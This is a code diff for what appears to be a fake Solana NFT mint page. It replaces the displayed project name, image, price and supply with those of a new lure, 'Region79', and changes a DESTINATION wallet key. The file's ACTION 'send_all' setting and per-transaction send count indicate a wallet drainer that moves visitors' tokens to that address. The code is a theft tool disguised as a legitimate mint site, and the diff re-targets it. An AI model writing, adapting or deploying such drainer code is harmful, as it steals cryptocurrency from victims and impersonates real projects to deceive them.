@@ -6,10 +6,10 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = '0.19-0.99'
-const image = 'https://pbs.twimg.com/profile_images/1666856380211376171/jQ-Vsp67_400x400.jpg'
-const Title = '𝗦 𝗶 𝗻 𝗼 𝗕 𝗶'
-const supply = 91
+const solAmount = '1.88/2.37/2.69'
+const image = 'https://pbs.twimg.com/profile_images/1648376776371077120/Qdhl8CI4_400x400.jpg'
+const Title = 'Region79'
+const supply = 1971
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -19,7 +19,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('4444yauc6XPT2TKY1GQkQ88SKeJaSVzH5JkohuHmPJNR');
+const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
